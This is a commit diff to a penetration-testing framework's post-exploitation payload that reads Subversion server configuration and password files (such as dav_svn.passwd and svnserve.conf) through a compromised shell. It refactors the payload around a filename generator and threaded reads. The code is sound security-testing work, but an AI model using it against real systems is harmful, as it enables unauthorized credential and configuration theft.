49b94231bc8ac9c96983aa0b8518e84d984e52da
andresriancho <andresriancho@16c29cf1-982c-0410-8ff8-8bb040e68b5b>
2012-08-22 17:09:34 +0000

    Rewrote payload to use new threadpool Added unittest

--- plugins/attack/payloads/payloads/svn_config_files.py
+++ plugins/attack/payloads/payloads/svn_config_files.py
@@ -8,9 +8,50 @@ class svn_config_files(base_payload):
     '''
     This payload shows SVN Server configuration files
     '''
+    def fname_generator(self):
+        yield '/etc/httpd/conf.d/subversion.conf'
+        yield '/etc/httpd/conf.d/viewvc.conf'
+        yield '/etc/viewvc/viewvc.conf'
+        yield '/opt/viewvc/viewvc.conf'
+        yield '/etc/httpd/conf.d/statsvn.conf'
+        yield '/srv/trac/projectX/conf/trac.ini'
+        yield '/etc/apache2/conf.d/subversion.conf'
+        yield '/etc/apache2/dav_svn.passwd'
+        yield '/etc/apache2/dav_svn.password'
+        yield '/etc/apache2/httpd.conf'
+        yield '/etc/apache2/svn.conf'
+        yield '/etc/subversion/conf/svnserve.conf'
+        yield '/usr/local/subversion/conf/httpd.conf'
+        yield '/etc/sasl/subversion.conf'
+        yield '/var/local/svn/conf/svnserve.conf'
+        yield '/srv/svn/repositories/svntest/conf/svnserve.conf'
+        yield '/var/svn/conf/commit-access-control.cfg'
+        yield '/etc/subversion/hairstyles'
+        yield '/etc/subversion/servers'
+        yield '/etc/subversion/config'
+
+        users_info = self.exec_payload('users')
+        
+        for user in users_info:
+            directory = users_info[user]['home']
+
+            yield directory+'.subversion/config'
+            yield directory+'.subversion/config_backup'
+            yield directory+'.subversion/servers'
+            yield directory+'.subversion/hairstyles'
+            yield directory+'/conf/svnserve.conf'
+            yield directory+'/conf/passwd'
+
+        apache_config_directory = self.exec_payload('apache_config_directory')['apache_directory']
+        for directory in apache_config_directory:
+            yield directory+'mods-enabled/dav_svn.conf'
+
+        for folder in kb.kb.getData('password_profiling', 'password_profiling'):
+            yield '/srv/svn/'+folder.lower()+'/conf/svnserve.conf'
+            yield '/srv/svn/'+folder.lower()+'/conf/passwd'    
+        
     def api_read(self, parameters):
         self.result = {}
-        files = []
 
         def parse_parent_path(config):
             parent_path = re.findall('^(?<=SVNParentPath )(.*)', config, re.MULTILINE)
@@ -62,76 +103,16 @@ class svn_config_files(base_payload):
             if not only_parse:
                 self.result[ file ] = file_content
 
-        files.append('/etc/httpd/conf.d/subversion.conf')
-        files.append('/etc/httpd/conf.d/viewvc.conf')
-        files.append('/etc/viewvc/viewvc.conf')
-        files.append('/opt/viewvc/viewvc.conf')
-        files.append('/etc/httpd/conf.d/statsvn.conf')
-        files.append('/srv/trac/projectX/conf/trac.ini')
-        files.append('/etc/apache2/conf.d/subversion.conf')
-        files.append('/etc/apache2/dav_svn.passwd')
-        files.append('/etc/apache2/dav_svn.password')
-        files.append('/etc/apache2/httpd.conf')
-        files.append('/etc/apache2/svn.conf')
-        files.append('/etc/subversion/conf/svnserve.conf')
-        files.append('/usr/local/subversion/conf/httpd.conf')
-        files.append('/etc/sasl/subversion.conf')
-        files.append('/var/local/svn/conf/svnserve.conf')
-        files.append('/srv/svn/repositories/svntest/conf/svnserve.conf')
-        files.append('/var/svn/conf/commit-access-control.cfg')
-        files.append('/etc/subversion/hairstyles')
-        files.append('/etc/subversion/servers')
-        files.append('/etc/subversion/config')
+        for file_path, file_content in self.read_multi(self.fname_generator()):
+            if file_content:
+                multi_parser(self, file_path, file_content)
 
-        users_info = self.exec_payload('users')
-        
-        for user in users_info:
-            directory = users_info[user]['home']
-
-            files.append(directory+'.subversion/config')
-            files.append(directory+'.subversion/config_backup')
-            files.append(directory+'.subversion/servers')
-            files.append(directory+'.subversion/hairstyles')
-
-        apache_config_directory = self.exec_payload('apache_config_directory')['apache_directory']
-        for directory in apache_config_directory:
-            dav_conf_file_content = self.shell.read(directory+'mods-enabled/dav_svn.conf')
-            if dav_conf_file_content:
-                multi_parser(self, directory+'mods-enabled/dav_svn.conf', dav_conf_file_content)
-
+        #FIXME: For some strange reason, if we put this into the fname_generator
+        #       method, the whole thing freezes.
         apache_config_files= self.exec_payload('apache_config_files')['apache_config']
-        for file, file_content in apache_config_files.iteritems():
+        for file_path, file_content in apache_config_files.iteritems():
             if file_content:
-                multi_parser(self, file, file_content, True)
-    
-        if kb.kb.getData('password_profiling', 'password_profiling'):
-            users_info = self.exec_payload('users')
-            
-            for user in users_info:
-                home = users_info[user]['home']
-
-                for dirname in kb.kb.getData('password_profiling', 'password_profiling'):
-                    file_content = self.shell.read(home+dirname.lower()+'/conf/svnserve.conf')
-                    passwd_content = self.shell.read(home+dirname.lower()+'/conf/passwd')
-                    if file_content:
-                        multi_parser(self, home+dirname.lower()+'/conf/svnserve.conf', file_content)
-                    if passwd_content:
-                        multi_parser(self, home+dirname.lower()+'/conf/passwd', passwd_content)
-
-        
-        if kb.kb.getData('password_profiling', 'password_profiling'):
-            for folder in kb.kb.getData('password_profiling', 'password_profiling'):
-                file_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/svnserve.conf')
-                passwd_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/passwd')
-                if file_content:
-                    multi_parser(self, '/srv/svn/'+folder.lower()+'/conf/svnserve.conf', file_content)
-                if passwd_content:
-                    multi_parser(self, '/srv/svn/'+folder.lower()+'/conf/passwd', passwd_content)
-
-        for file in files:
-            file_content = self.shell.read(file)
-            if file_content:
-                multi_parser(self, file, file_content)
+                multi_parser(self, file_path, file_content)
 
         return self.result
 
